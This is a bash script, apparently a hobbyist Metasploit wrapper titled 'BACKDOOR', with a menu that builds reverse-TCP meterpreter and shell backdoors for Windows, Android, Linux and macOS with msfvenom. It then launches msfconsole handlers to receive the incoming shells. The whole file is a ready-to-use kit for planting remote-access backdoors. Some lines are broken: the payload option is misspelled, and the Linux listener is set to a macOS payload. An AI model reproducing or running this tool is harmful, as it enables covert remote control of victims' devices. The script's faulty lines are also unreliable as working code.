#!/bin/bash
#::::::::::::::::::::::::::::::::::::::::::::::::::::
#:::     TN PLASTICK                              :::
#::: codded by TN PLASTICK Upgrade by  Rdroid99    ::
#:::  tools creat backdor using msfvenom          :::
#::::::::::::::::::::::::::::::::::::::::::::::::::::
red='\e[31m'
wht='\e[0m'
grn='\e[32m'
service postgresql start
service apache2 start
mkdir ~/HackingTools/OSploit/pyload/
clear
echo -e "${grn}"
echo "::::::::::::::::::::::::::::::::::::::::::::::::::"
echo "::::::::::::::::TOOLS BY TN PLASTICK::::::::::::::"
echo "::::::::::::::::UPGRADE BY RDROID99:::::::::::::::"
echo "::::::::::::::::::::::::::::::::::::::::::::::::::"
read -p "do you run tools? type y/n : " run;
if [ $run = y ]
then
echo "loading..."
sleep 2
elif [ $opt = n ]
then
echo "   GOOD BYE"
echo "<==============>"
sleep 2
exit
else
echo "input falid option..."
fi
ulang="n"
while [ "$ulang" != "$tidak" ]
do
clear

echo -e "${red}██████╗░░█████╗░░█████╗░██╗░░██╗██████╗░░█████╗░██████╗░"
echo -e "${red}██╔══██╗██╔══██╗██╔══██╗██║░██╔╝██╔══██╗██╔══██╗██╔══██╗"                            
echo -e "${red}██████╦╝███████║██║░░╚═╝█████═╝░██║░░██║██║░░██║██████╔╝"
echo -e "${wht}██╔══██╗██╔══██║██║░░██╗██╔═██╗░██║░░██║██║░░██║██╔══██╗"
echo -e "${wht}██████╦╝██║░░██║╚█████╔╝██║░╚██╗██████╔╝╚█████╔╝██║░░██║"
echo -e "${wht}╚═════╝░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═════╝░░╚════╝░╚═╝░░╚═╝"
echo -e "${red}"
echo "                     ::::::::::::::::::::::::::::::::::::::::::::::::::"
echo -e "                     ::::::::::::::::${grn}TOOLS BY TN PLASTICK${red}::::::::::::::"
echo -e "                     ::::::::::::::::${grn}saweria.co/Rdroid${red}   ::::::::::::::"     
echo "                     ::::::::::::::::::::::::::::::::::::::::::::::::::"
echo -e "${wht}"
sleep 3
date 
echo -e "${grn}"
echo " 1. creat pyload      | created backdor using msfvenom "
echo " 2. exploit pyload    | exploit backdor using msfconsole "
echo -e " 666. exit            | exit tools${wht}   "
read -p " select option : " atas;
if [ $atas = 1 ]                           
then 
clear
echo -e "${red}██████╗░░█████╗░░█████╗░██╗░░██╗██████╗░░█████╗░██████╗░"
echo -e "${red}██╔══██╗██╔══██╗██╔══██╗██║░██╔╝██╔══██╗██╔══██╗██╔══██╗"
echo -e "${red}██████╦╝███████║██║░░╚═╝█████═╝░██║░░██║██║░░██║██████╔╝"
echo -e "${wht}██╔══██╗██╔══██║██║░░██╗██╔═██╗░██║░░██║██║░░██║██╔══██╗"
echo -e "${wht}██████╦╝██║░░██║╚█████╔╝██║░╚██╗██████╔╝╚█████╔╝██║░░██║"
echo -e "${wht}╚═════╝░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═════╝░░╚════╝░╚═╝░░╚═╝"
echo -e "${red}"
echo "                     ::::::::::::::::::::::::::::::::::::::::::::::::::"
echo -e "                     ::::::::::::::::${grn}TOOLS BY TN PLASTICK${red}::::::::::::::"
echo -e "                     ::::::::::::::::${grn}UPGRADED BY RDROID99${red}::::::::::::::"
echo "                     ::::::::::::::::::::::::::::::::::::::::::::::::::"
echo -e "${wht}"
date
sleep 3
echo "pyload xploit all os"         
echo -e "${grn} 1.Windows"
echo -e "${grn} 2.android"
echo -e "${grn} 3.Linux"
echo -e "${grn} 4.mac os"
echo -e "${red} 666.close"
echo -e "${wht}"
read -p "Use  options > " opt;

if [ $opt = 1 ]
then
read -p "input lhost >" ip;
read -p "input port >" ort;
read -p "enter the name >" ware;
echo "created Windows pyload...."
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$ort -f exe > ~/HackingTools/OSploit/pyload/$ware.exe

echo ".:::Succes cek file /HackingTool/OSploit/pyload:::."
elif [ $opt = 2 ]
then
read -p "input lhost >" ip;
read -p "input port >" ort;
read -p "enter the name >" ware;
echo "created Android pyload...."
msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$ort R > ~/HackingTools/OSploit/pyload/$ware.apk
echo ".:::Succes cek file /HackingTool/OSploit/pyload:::."
elif [ $opt = 3 ]
then
read -p "input lhost >" ip;
read -p "input port >" ort;
read -p "enter the name >" ware;
echo "created linux pyload...."

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip LPORT=$ort -f elf > ~/HackingTools/OSploit/pyload/$ware.elf

echo ".:::Succes cek file /HackingTool/OSploit/pyload:::."
elif [ $opt = 4 ]
then
read -p "input lhost >" ip;
read -p "input port >" ort;
read -p "enter the name >" ware;
echo "created macho pyload...."
msfvenom -p osx/x86/shell_reverse_tcp LHOST=$ip LPORT=$ort -f macho > ~/HackingTools/OSploit/pyload/$ware.macho
echo ".:::Succes cek file /HackingTool/OSploit/pyload:::."
elif [ $opt = 666 ]
then
echo "   GOOD BYE"
echo "<==============>"
sleep 2
exit
else
echo "input error..."
fi

elif [ $atas = 2 ]
then
clear
sleep 0.2
echo "````/oooooooooo++++++++++++++++++////////oshdmmmmdhyo/::::::::oooooooooooooooooooooooooooo////+"
echo "````/oooooooooo++++++++++++++++++/////ohNNMMMMMMMMMMMNds/:::::/ooooooooooooooooooooooooooo////+"
echo "````/oooooooooo++++++++++++++++++///+hNMMMMMMMMMMMMMMMMMm+:::::+oooooooooooooooooooooooooo/////"
echo "````/oooooooooo++++++++++++++++++//+dMMMMMMMMMMMMMMMMMMMMN+::::/oooooooooooooooooooooooooo/////"
echo "````/oooooooooo++++++++++++++++++//smmMMMMMMMMMMMMMMMMMMNdd:::::+ooooooooooooooooooooooooo/:::/"
echo "````/oooooooooo++++++++++++++++++//ydhMMMMMMMMMMMMMMMMMMNsm:::::/+++++++++++++++++++++++++::::/"
echo "````/oooooooooo++++++++++++o+++++//sNoNMMMMMMMMMMMMMMMMMyhh::::::/oo++++++++++++++++++++++::::/"
echo "````/oooooooooo+++++++++sdmNd++++///doNmhyssdNMMMmyosydNod+:::::/hNmo+++++++++++++++++++++::::/"
echo "````/oooooooooo+++++++++ymNMMh++++//+oN+/////hMMN+//::/hh+:::::/yMMMdo++++++++++++++++++++:---:"
echo "````/oooooooooo++++++++hNMMMMMmhso+//dN+////ommdNy//:::hN/::::odMMMMNm++++++++++++++++++++----:"
echo "````/oooooooooo++++++++hNNNNNNNNMNmhsyNdyyhmNy//oNmdyshNd/:/ohNNNNNNdm+///////////////////----:"
echo "````/oooooooooo+++++++++ooooooooshdmNhssymMMN+///dMMNhso+oydmdyo+/++oo////////////////////----:"
echo "````/oooooooooo++++++++++++++++++//+oss/dsdNMdhdhNMmshosdhs+/:::::::://///////////////////-...:"
echo "````/oooooooooo++++++++++++++++++//////+NmoyhhhhhhhoyMy//:::::::::::://///////////////////....:"
echo "````/oooooooooo++++++++++++++++++//////+NNossshsyyoodMy:::::::::::::::////////////////////....-"
echo "````/oooooooooo++++++++++++++++++///++osymmhssysssymNhss+//:::::::::::://////////////////:....-"
echo "````/oooooooooo++++++++++++++++++osydmNmy+ymNNmmNNNh++hmNmdhs+///////:::::::::////://////:.```-"
echo "````/oooooooooo++++++++++ossyhhdmmmmdyo/////oyysys+/:::/+shmNMmmdmNNmy::::::::::::::::::::.```-"
echo "````/oooooooooo+++++++++dMMMMNddhso+////////////////:::::::/+yhhdNMMMm/:::::::::::::::::::````-"
echo "````/oooooooooo+++++++++NMMMMmyo++//////////////////:::::::::::+yhNNh/::::::::::::::::::::````-"
echo "````/oooooooooo+++++++++ymNNNy+++///////////////////:::::::::::::+so::::::::::::::::::::::````-"
echo "                    ::::::::::::::::::::::::::::::::::::::::::::::::::"
echo "                    ::::::::::::::::TOOLS BY TN PLASTICK::::::::::::::"
echo "                    ::::::::::::::::UPGRADED BY RDROID99::::::::::::::"
echo "                    ::::::::::::::::::::::::::::::::::::::::::::::::::"
echo
sleep 3
echo "select OS to exploit "
echo " 1.Windows"
echo " 2.android"
echo " 3.Linux"
echo " 4.mac os"
echo " 666.close"
echo ""
read -p "select OS : " ploit;
if [ $ploit = 1 ]
then
echo "exploit Windows..."
echo "pleas wait..."
echo "open metasploit-framework....."
sleep 2
touch ~/HackingTools/OSploit/meterpreter.rc
echo use  exploit/multi/handler/ > ~/HackingTools/OSploit/meterpreter.rc
echo set pyload windows/meterpreter/reverse_tcp  >> ~/HackingTools/OSploit/meterpreter.rc
read -p "Input lhos > " Ip; 
echo set LHOST $Ip >> ~/HackingTools/OSploit/meterpreter.rc
read -p "Inpunt lport > " Lp;
echo set LPORT $Lp >> ~/HackingTools/OSploit/meterpreter.rc
echo exploit >> ~/HackingTools/OSploit/meterpreter.rc
cat ~/HackingTools/OSploit/meterpreter.rc
xterm -e msfconsole -r ~/HackingTools/OSploit/meterpreter.rc

elif [ $ploit = 2 ]
then
echo "exploit android..."
echo "pleas wait..."
echo "open metasploit-framework....."
sleep 2
touch ~/HackingTools/OSploit/meterpreter_droid.rc
echo use exploit/multi/handler/ > ~/HackingTools/OSploit/meterpreter_droid.rc
echo set PYLOAD android/meterpreter/reverse_tcp >> ~/HackingTools/OSploit/meterpreter_droid.rc
read -p "Input lhos > " Ip;
echo set LHOST $Ip >> ~/HackingTools/OSploit/meterpreter_droid.rc
read -p "Inpunt lport > " Lp;
echo set LPORT $Lp >> ~/HackingTools/OSploit/meterpreter_droid.rc 
echo exploit >> ~/HackingTools/OSploit/meterpreter_droid.rc
cat ~/HackingTools/OSploit/meterpreter_droid.rc
xterm -e msfconsole -r ~/HackingTools/OSploit/meterpreter_droid.rc

elif [ $ploit = 3 ]
then   
echo "exploit linux..."
echo "pleas wait..."
echo "open metasploit-framework....."
sleep 2
touch ~/HackingTools/OSploit/meterpreter_linux.rc
echo use exploit/multi/handler/ > ~/HackingTools/OSploit/meterpreter_linux.rc
echo set PYLOAD osx/x86/shell_reverse_tcp >> ~/HackingTools/OSploit/meterpreter_linux.rc
read -p "Input lhos > " Ip;
echo set LHOST $Ip >> ~/HackingTools/OSploit/meterpreter_linux.rc
read -p "Inpunt lport > " Lp;
echo set LPORT $Lp >> ~/HackingTools/OSploit/meterpreter_linux.rc
echo exploit >> ~/HackingTools/OSploit/meterpreter_linux.rc
cat ~/HackingTools/OSploit/meterpreter_linux.rc
xterm -e msfconsole -r ~/HackingTools/OSploit/meterpreter_linux.rc

elif [ $ploit = 4 ]
then   
echo "exploit MacOS..."
echo "pleas wait..."
echo "open metasploit-framework....."
sleep 2
touch ~/HackingTools/OSploit/meterpreter_mac.rc
echo use exploit/multi/handler/ > ~/HackingTools/OSploit/meterpreter_mac.rc
echo set PYLOAD osx/x86/shell_reverse_tcp >> ~/HackingTools/OSploit/meterpreter_mac.rc
read -p "Input lhos > " Ip;
echo set LHOST $Ip >> ~/HackingTools/OSploit/meterpreter_mac.rc
read -p "Inpunt lport > " Lp;
echo set LPORT $Lp >> ~/HackingTools/OSploit/meterpreter_mac.rc
echo exploit >> ~/HackingTools/OSploit/meterpreter_mac.rc
cat ~/HackingTools/OSploit/meterpreter_mac.rc
xterm -e msfconsole -r ~/HackingTools/OSploit/meterpreter_mac.rc

elif [ $ploit = 666 ]
then   
echo "   GOOD BYE"
echo "<||========||>"
sleep 2
exit

else
echo "input not found..."
fi
elif [ $atas = 666 ]
then
echo "   GOOD BYE"
echo "<||========||>"
sleep 2
exit

else
echo "input not found..."
fi
read -p "use tools try again? type y/n : " tidak;
echo "please wait..."
sleep 3
clear
done
